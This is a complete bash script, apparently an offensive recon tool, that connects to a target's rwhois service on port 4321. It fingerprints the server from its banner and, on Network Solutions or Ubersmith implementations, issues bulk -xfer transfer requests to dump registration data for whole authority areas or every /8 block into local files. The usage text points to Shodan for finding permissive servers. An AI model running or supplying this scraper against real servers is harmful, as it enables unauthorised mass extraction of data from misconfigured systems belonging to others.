#!/bin/bash
# whori.sh by ShadowHatesYou
if [ $# != 1 ]; then
        echo "Usage: $0 <IP/host>"
	echo "Attempts to scrape rwhois data from permissive environments"
	echo "Check \"shodan search rwhois\""
        exit
fi;

exec 5<>/dev/tcp/$1/4321
banner="$(head -n 1 <&5)"

if [[ $banner =~ "Network Solutions" ]]; then
	echo "NetworkSolutions rwhoisd detected, grabbing SOA"
	exec 5<>/dev/tcp/$1/4321
	echo -e "-soa\n-quit" >&5
	cat <&5 > .scratchpad_$1
	if [[ $(cat .scratchpad_$1) =~ "^%error" ]]; then
		echo "Error encountered: $(cat .scratchpad_$1)"; exit
	fi
	cat .scratchpad_$1 | grep "authority" | cut -d: -f2- > .authority_areas_$1
	if [[ $(wc -l .authority_areas_$1 | awk '{ print $1}') -gt 0 ]]; then
		for authority_area in $(cat .authority_areas_$1); do
			exec 5<>/dev/tcp/$1/4321
			echo -e "-xfer $authority_area\n-quit" >> $1_4321
			echo -e "-xfer $authority_area\n-quit" >&5
			cat <&5 >> $1_4321
		done
	echo "Done: ./$1_4321"
	else
		echo "No lines in authority areas: ./.authority_areas_$1"; exit
	fi
elif [[ $banner =~ "Ubersmith" ]]; then
	echo "Ubersmith rwhoisd detected, walking /8s"
	for i in {0..255}; do
		exec 5<>/dev/tcp/$1/4321
		echo -e "-xfer $i.0.0.0/8\n-quit" >> $1_4321
		echo -e "-xfer $i.0.0.0/8\n-quit">&5
		cat <&5 >> $1_4321
        	echo -ne "Done: $i.0.0.0/8\r"
	done
	echo "Done: ./$1_4321"
elif [[ $banner =~ "\(C.NT" ]]; then
	echo "Non-vulnerable rwhois implementation: $banner"; exit
else
	echo "Unknown rwhois implementation: $banner"; exit
fi
rm .scratchpad_$1 .authority_areas_$1
